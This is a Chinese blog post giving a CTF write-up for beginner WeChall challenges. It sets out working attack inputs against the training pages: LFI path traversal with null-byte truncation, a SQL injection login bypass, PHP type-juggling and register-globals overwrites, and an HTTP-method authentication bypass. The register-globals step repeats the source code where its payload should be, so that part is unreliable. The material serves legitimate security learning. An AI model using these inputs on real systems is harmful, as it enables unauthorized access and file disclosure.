---
title: WeChell_WP
url: 494.html
id: 494
categories:
  - 未分类
date: 2018-10-21 00:00:00
tags:
---

前
-

偶遇了一个网站 [wechall.net](www.wechall.net) ，发现是CTF 的一个很好的入门之地。很多很经典的内容在这里学习， 还是不错的。这一篇，是这周的解题过程中的一个记录吧。

*   **WeChall 14 145 yes 104 3.74% Oct 21, 2018 - 05:43:34**

题目同样的覆盖很广，这里做个分类

* * *

EZ
--

前面基础部分就跳过了：

*   view source F12/c+o+i
    
*   Stegano hexedit
    
*   Caesar 1 Caesar 移位
    
*   [WWW-Robots](https://en.wikipedia.org/wiki/Robots_exclusion_standard) 访问，暴露目录结构
    
*   ASCII py进行翻译
    
*   URL url编码
    
*   Program 在得到 内容的1.33 秒内提交到另一个地址
    
        $.get('https://www.wechall.net/challenge/training/programming1/index.php?action=request').success(function(data){var x = data; $.get('https://www.wechall.net/challenge/training/programming1/index.php?answer='+x)})
    

WEB
---

### PHP LFI

> 之前的 白帽子里面刚刚看到，这里就用上了， 挺好~
> 
> *   \[File inclusion vulnerability\]([https://en.wikipedia.org/wiki/File\_inclusion\_vulne](https://en.wikipedia.org/wiki/File_inclusion_vulne)\- rability#Local\_File\_Inclusion)

LFI 是本地包含漏洞，使得客户端可以非法的包含 远程服务器的本地文件。

* * *

所给的提示代码如下

    $filename = 'pages/'.(isset($_GET["file"])?$_GET["file"]:"welcome").'.html';
    include $filename;

可见这里直接从 我们的 get 的 `file` 里面得到参数，然后进行拼接。

    // 尝试请求：
    https://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php
    
    // 返回错误信息：
    PHP Warning(2): include(pages/../solution.php.html): failed to open stream: No such file or directory in www/challenge/training/php/lfi/up/index.php(54) : eval()'d code line 1

由于这里对我们的内容 进行了 `.html` 的拼接，所以这里又是一个点了，`%00截断`

%00 实际上就是直接 ascii 的十六进制的编码，这里的 00 就是eof 符号。由于 php 的内核是使用 C 进行编写的，所以这里会存在 00 截断的特性，所以构造如下

    // 再次请求：
    https://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00

成功的pass。

### PHP-0817

这个题目的如下， 一样是需要包含 本地的 solution 这个 文件。

    <?php
    if (isset($_GET['which']))
    {
            $which = $_GET['which'];
            switch ($which)
            {
            case 0:
            case 1:
            case 2:
                    require_once $which.'.php';
                    break;
            default:
                    echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);
                    break;
            }
    }
    ?>

整个过程是十分的简单，直接 构造， `which=solution` 即可。这里主要分析一下这个过程，这个导致的原因还是由于 php 的弱类型的特性导致的。这里的Switch 进行的是 整形的比较，所以 当which 是个字符串的时候，一样的会被莫名其妙的转化为了数字。从而绕过了，这个 switch 的判断。

> 这里偶遇一篇很好的文章：
> 
> *   [PHP弱类型漏洞](http://archimesan.me/2017/12/21/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/)

### MYSQL 1

这里是一个比较基础的注入，给出了源码，可以直接看出构造过程。：

    $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
    
    if (false === ($result = $db->queryFirst($query))) {
            echo GWF_HTML::error('Auth1', $chall->lang('err_unknown'), false); # Unknown user
            return false;
    }

重点，就是在上面的输入参数里面对用户的输入没有进行检测，（所有的用户输入 都是邪恶的！）

这里构造思路很简单，当得到一个用户的查询记录就好了，密码？不存在的~。

    admin'  # < 注释掉 后面的密码查询部分
         ^ 用于闭合 admin 这个查询参数

所以，构造上述的表单数据进行提交，即可。

> [SQL注入攻击常见方式及测试方法](https://blog.csdn.net/github_36032947/article/details/78442189)

### PHP 全局变量覆盖

这个也是在书中刚好看到了，很幸运。这个问题是 php 中的全局变量覆盖的问题。`REGISTER GLOBALS = ON` 导致，用户可以提交参数，覆盖了 php中的变量。导致很多问题。

这个题目中，一样的是一个登陆的过程，不过，贴出了源代码，可以更清楚的看到问题：

    if (isset($_POST['password']) && isset($_POST['username']) && is_string($_POST['password']) && is_string($_POST['username']) )
    {
        $uname = GDO::escape($_POST['username']);
        $pass = md5($_POST['password']);
        $query = "SELECT level FROM ".GWF_TABLE_PREFIX."wc_chall_reg_glob WHERE username='$uname' AND password='$pass'";
        $db = gdo_db();
        if (false === ($row = $db->queryFirst($query))) {
            echo GWF_HTML::error('Register Globals', $chall->lang('err_failed'));
        } else {
            # Login success
            $login = array($_POST['username'], (int)$row['level']);
        }
    }
    
    if (isset($login))
    {
        echo GWF_HTML::message('Register Globals', $chall->lang('msg_welcome_back', array(htmlspecialchars($login[0]), htmlspecialchars($login[1]))));
        if (strtolower($login[0]) === 'admin') {
            $chall->onChallengeSolved(GWF_Session::getUserID());
        }
    }

重点，就在下面的 login 的状态检测，直接使用了 login 的0，1 的参数。所以这里，我们就使用变量覆盖：构造：

    if (isset($login))
    {
        echo GWF_HTML::message('Register Globals', $chall->lang('msg_welcome_back', array(htmlspecialchars($login[0]), htmlspecialchars($login[1]))));
        if (strtolower($login[0]) === 'admin') {
            $chall->onChallengeSolved(GWF_Session::getUserID());
        }
    }

便很顺利的，绕过了前面的密码的检测。

> [\[web安全\] 变量覆盖漏洞](https://blog.csdn.net/hitwangpeng/article/details/45972099)

CODE
----

### Transposition 移位密码 (置换密码)

题目如下移位密码，题目甚至很贴心的给出了 wiki [transposition ciphers](http://en.wikipedia.org/wiki/Transposition_cipher) 。

    oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt  oes eoyrup sawsro don:wc mldcpgsopb.l

实际上，这里是对一个简单加密形式的一个认识。可以这样理解，把原文一句话，分割成多个片段，在每个片段里面进行字母的移位。比如第一个和第二个换位。以题目举例。

    oWdnreuf.lY uoc
    Wonderful.Y uoc
    214365214365124

进行解密之后得到了 原明文.

Stegano 隐写
----------

题目中给出了提示连接，这个是用软件点点点，但是原理要学会：

> Hidden Hint: [Steganabara explained](http://wechall.blogspot.com/2007/11/steganabara-explained.html)
> 
> [隐写术总结](https://www.jianshu.com/p/67233f607f75)

### LSB

一般图像的隐写方式，使用LSB(Least Significant Bit),对内容进行隐写。因为图片，可以解析为一个矩阵，每个像素都是三原色的。(0,0,0)~(255,255,255) 如果使用最低有效位的话 (254,254,254) 这样就隐藏了三个 bit ，但是肉眼一般是看不出差距的。

MISC
----

### Limit Access

Apache 的 访问认证的绕过。前面以为是 `.htpasswd` 的目录的访问，发现不是的，后面突然发现 ，limit 里面是指定了 限制的 Http 的请求方式

    AuthUserFile .htpasswd
    AuthGroupFile /dev/null
    AuthName "Authorization Required for the Limited Access Challenge"
    AuthType Basic
    <Limit GET>
    require valid-user
    </Limit>

Limit 了 GET方式，我们可以使用 POST ！js 脚本构造：

    $.post('protected.php').success(function(rdata){console.log(rdata)})

成功的，绕过了登陆限制。

后
-

以上，简简单单的几个 题目的 writeUP 已经写完了，虽然都是相当的基础的类型的题目，不过，自己也是折腾了好一会，慢慢积累~还是挺有趣的~加油